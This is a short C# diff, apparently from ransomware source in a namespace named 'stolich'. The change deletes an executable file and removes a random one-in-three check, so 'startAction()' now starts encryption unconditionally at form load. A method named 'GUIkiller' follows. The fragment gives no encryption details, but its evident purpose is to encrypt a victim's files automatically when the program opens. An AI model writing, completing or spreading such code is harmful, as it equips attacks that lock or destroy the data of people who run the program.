@@ -101,11 +101,8 @@ namespace stolich
 			{
 				File.Delete("p" + yty + "h.exe");
 			}
-
-			Random toth = new Random();
-			if (toth.Next(1,4) == 3)
-				//starts encryption at form load
-            	startAction();
+			//starts encryption at form load
+            startAction();
         }
 
 		public void GUIkiller()
